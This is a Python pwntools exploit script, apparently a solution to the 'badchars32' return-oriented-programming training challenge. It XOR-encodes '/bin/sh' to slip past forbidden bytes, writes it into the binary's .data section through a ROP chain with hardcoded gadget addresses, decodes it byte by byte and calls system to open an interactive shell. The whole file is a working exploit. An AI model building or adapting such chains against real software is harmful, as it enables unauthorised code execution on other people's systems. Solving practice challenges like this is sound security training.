#!/usr/bin/env python

from pwn import *

def encode(string, badchars):
    def xor(string, character):
        res = ""
        for c in string:
            res += chr(ord(c) ^ ord(character))
        return res


    for i in range(0, 256):
        ch = chr(i)
        if ch not in badchars:
            res = xor(string, ch)
            if not any([c in badchars for c in res]):
                return (res, ch)

    return None, None
        

p = process("./badchars32")
p.recv(1024)

badchars = ["b", "i", "c", "/", "f", "n", "s", " "]
string = "/bin/sh\x00"
encoded, key = encode(string, badchars)

payload = (
    "\x90" * 44 +

    # write encoded to memory
    p32(0x08048899) + # pop esi ; pop edi ; ret
    encoded[:4] + # encoded[:4]
    p32(0x0804a038) + # .data
    p32(0x08048893) + # mov dword ptr [edi], esi ; ret

    p32(0x08048899) + # pop esi ; pop edi ; ret
    encoded[4:8] + # encoded[:4]
    p32(0x0804a03c) + # .data + 4
    p32(0x08048893) + # mov dword ptr [edi], esi ; ret

    # decode 
    p32(0x08048897) + # pop ecx ; ret
    p32(ord(key)) +
    p32(0x08048461) + # pop ebx ; ret
    p32(0x0804a038) + # .data
    p32(0x08048890) + # xor byte ptr [ebx], cl ; ret

    p32(0x08048461) + # pop ebx ; ret
    p32(0x0804a039) + # .data + 1
    p32(0x08048890) + # xor byte ptr [ebx], cl ; ret

    p32(0x08048461) + # pop ebx ; ret
    p32(0x0804a03a) + # .data + 2
    p32(0x08048890) + # xor byte ptr [ebx], cl ; ret

    p32(0x08048461) + # pop ebx ; ret
    p32(0x0804a03b) + # .data + 3
    p32(0x08048890) + # xor byte ptr [ebx], cl ; ret

    p32(0x08048461) + # pop ebx ; ret
    p32(0x0804a03c) + # .data + 4
    p32(0x08048890) + # xor byte ptr [ebx], cl ; ret

    p32(0x08048461) + # pop ebx ; ret
    p32(0x0804a03d) + # .data + 5
    p32(0x08048890) + # xor byte ptr [ebx], cl ; ret

    p32(0x08048461) + # pop ebx ; ret
    p32(0x0804a03e) + # .data + 6
    p32(0x08048890) + # xor byte ptr [ebx], cl ; ret

    p32(0x08048461) + # pop ebx ; ret
    p32(0x0804a03f) + # .data + 7
    p32(0x08048890) + # xor byte ptr [ebx], cl ; ret

    p32(0x80484e0) + # system@plt
    p32(0x41414141) + # ebp
    p32(0x0804a038) # /bin/sh
)

p.sendline(payload)
p.interactive()

p.close()
